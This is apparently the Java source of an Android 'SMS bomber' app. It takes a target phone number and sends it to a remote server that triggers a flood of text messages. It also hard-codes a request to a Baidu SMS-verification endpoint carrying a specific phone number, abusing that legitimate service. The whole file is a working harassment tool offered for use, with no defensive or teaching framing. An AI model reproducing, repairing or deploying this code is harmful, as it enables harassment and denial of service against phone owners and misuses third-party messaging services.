package msm.bomb.standopen;

import java.io.IOException;

import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.http.client.ClientProtocolException;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class Msmbomb extends Activity {
    private EditText input=null;
    private Button submit=null;
    public HttpClient httpClient = null;
	public Cookie[] cookies;
	private TextView result=null;
	static final String LOGON_SITE = "localhost";
	static final int LOGON_PORT = 8080;
	private boolean Is_Run=false;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        init();
    }
    
    public void init()
    {
    	input=(EditText)findViewById(R.id.phone);
    	submit=(Button)findViewById(R.id.submit);
    	result=(TextView)findViewById(R.id.result);
    	httpClient=new HttpClient();
    	Is_Run=false;
    	submit.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				if(!Is_Run)
				{
				if(input.getText().length()>0)
				{
					InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
					imm.hideSoftInputFromWindow(input.getWindowToken(), 0);
					String url_head="http://42.121.99.142/sms/index.php?hm=";
					String url_foot="&ok=";
					String url=url_head+input.getText().toString()+url_foot;
					submit_thread th=new submit_thread(url);
					th.start();
					submit.setText("停止");
					input.setEnabled(false);
					Is_Run=true;
				
				}
				else
				{
					Toast.makeText(Msmbomb.this, "输入不能为空！", Toast.LENGTH_SHORT).show();
				}
				}
				else
				{
					String url="http://42.121.99.142/sms/";
					submit_thread th=new submit_thread(url);
					th.start();
					submit.setText("开始");
					input.setEnabled(true);
					Is_Run=false;
				}
			}
		});
    }
    
    
    
    
    
    
    
    
    
    
    
    
    public class submit_thread extends Thread {
		
    	String url;
    	
    	public submit_thread(String url)
    	{
    		this.url=url;
    	}

		Handler handler = new Handler() {

			@SuppressLint("HandlerLeak")
			@Override
			public void handleMessage(Message msg) {
				// TODO Auto-generated method stub
				super.handleMessage(msg);
				result.setText(msg.obj.toString());
			
				
			}

		};

		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();
			
			
			try {
			
				String str=Dopost(url);
				
				Message msg = handler.obtainMessage();
				msg.obj = str;
				handler.sendMessage(msg);

			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}

		@Override
		public synchronized void start() {
			// TODO Auto-generated method stub
			super.start();
		}

		public String Dopost(String url) throws ClientProtocolException,
				IOException {
			String str=null;
			if(checkNetWorkStatus())
			{
		
		
				GetMethod getMethod = new GetMethod("http://i.baidu.com/?module=Default&controller=Personalset&action=sendSms&phone=18766966881&callback=bd__cbs__utkm7p");
			httpClient.getParams().setParameter(HttpMethodParams.USER_AGENT,
					"Mozilla/5.0 (Windows NT 6.1");
			httpClient.getHostConfiguration().setHost(LOGON_SITE, LOGON_PORT);
			httpClient.getParams().setParameter(
					HttpMethodParams.HTTP_CONTENT_CHARSET, "GBK");
			httpClient.getParams().setCookiePolicy(
					CookiePolicy.BROWSER_COMPATIBILITY);
			httpClient.executeMethod(getMethod);
			byte[] responseBody = getMethod.getResponseBody();
			str = new String(responseBody);
		Log.i("info", str);
			}
			
			return str;
		}
}
    
    
    
    
    
    
private boolean checkNetWorkStatus() {
	boolean netSataus = false;
	ConnectivityManager cwjManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
	cwjManager.getActiveNetworkInfo();
	if (cwjManager.getActiveNetworkInfo() != null) {
		netSataus = cwjManager.getActiveNetworkInfo().isAvailable();
	}
	return netSataus;
}
    
    
    
    
    
    
}